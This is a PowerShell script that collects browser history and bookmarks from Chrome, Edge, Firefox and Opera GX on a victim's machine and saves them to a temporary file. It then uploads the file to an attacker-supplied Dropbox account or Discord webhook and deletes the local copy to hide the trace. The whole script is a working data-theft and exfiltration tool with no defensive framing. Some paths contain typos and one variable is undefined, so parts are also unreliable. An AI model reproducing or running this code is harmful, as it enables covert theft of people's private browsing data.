function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory = $true)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory = $true)]
        [string]$DataType
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    switch -Regex ($Browser) {
        'chrome' {
            switch ($DataType) {
                'history'   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
                'bookmarks' { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
            }
            break
        }
        'edge' {
            switch ($DataType) {
                'history'   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
                'bookmarks' { $Path = "$env:USERPROFILE\AppData\Local\MicrosofEdge/User Data/Default/Bookmarks" }
            }
            break
        }
        'firefox' {
            if ($DataType -eq 'history') {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            }
            break
        }
        'opera' {
            switch ($DataType) {
                'history'   { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
                'bookmarks' { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
            }
            break
        }
        default {
            Write-Warning "Unsupported browser: $Browser"
            return
        }
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search) {
            [PSCustomObject]@{
                User     = $env:UserName
                Browser  = $Browser
                DataType = $DataType
                Data     = $_
            }
        }
    } 
}

$OutputFile = "$env:TMP\--BrowserData.txt"

Get-BrowserData -Browser "edge" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "chrome" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "firefox" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile

# Upload output file to Dropbox
function Upload-Dropbox {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [Alias("f")]
        [string]$SourceFilePath
    ) 

    $OutputFile = Split-Path $SourceFilePath -Leaf
    $TargetFilePath = "/$OutputFile"
    $Arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $Authorization = "Bearer $db"
    $Headers = @{
        "Authorization"   = $Authorization
        "Dropbox-API-Arg" = $Arg
        "Content-Type"    = 'application/octet-stream'
    }

    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $Headers
}

if (-not [string]::IsNullOrEmpty($db)) {
    Upload-Dropbox -SourceFilePath $OutputFile
}

# Upload output file to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false)]
        [string]$File,
        [Parameter(Position = 1, Mandatory = $false)]
        [string]$Text 
    )

    $HookUrl = "$dc"
    $Body = @{
        'username' = $env:username
        'content'  = $Text
    }

    if (-not [string]::IsNullOrEmpty($Text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $HookUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($File)) {
        curl.exe -F "file1=@$File" $HookUrl
    }
}

if (-not [string]::IsNullOrEmpty($dc)) {
    Upload-Discord -File $OutputFile
}

# Remove temporary file
Remove-Item $OutputFile -Force
